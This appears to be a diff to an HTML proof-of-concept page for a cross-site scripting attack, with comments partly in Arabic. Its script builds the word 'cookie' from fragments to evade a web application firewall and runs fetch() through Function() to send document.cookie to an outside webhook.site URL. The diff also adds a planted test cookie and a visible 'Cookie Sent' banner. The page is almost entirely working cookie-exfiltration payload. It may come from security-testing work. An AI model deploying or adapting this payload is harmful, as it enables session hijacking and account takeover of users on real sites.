@@ -9,17 +9,19 @@
   <p style="color: lime;">Your session cookie has been exfiltrated to an attacker-controlled server.</p>
 
   <script>
-    // Advanced WAF Bypass XSS Payload
+    // نضيف كوكي يدويًا لأغراض الإثبات
+    document.cookie = "testXSS=XSSdemo12345";
+
+    // Bypass WAF باستخدام Function
     const c = 'c' + 'oo' + 'kie';
     const url = 'https://webhook.site/0f33276b-fde5-40b4-bc91-a1cc01f1537d';
-
     const x = Function(`fetch("${url}?${c}=" + document.${c})`);
     x();
 
-    // Optional: modify DOM silently
+    // تغيير بسيط في الصفحة كدليل مرئي
     const box = document.createElement('div');
-    box.innerText = 'XSS Executed ✅';
-    box.style.cssText = "color:#0f0;font-size:24px;margin-top:20px;";
+    box.innerText = '✅ XSS Executed - Cookie Sent';
+    box.style.cssText = "color:#0f0;font-size:20px;margin-top:20px;";
     document.body.appendChild(box);
   </script>
 </body>
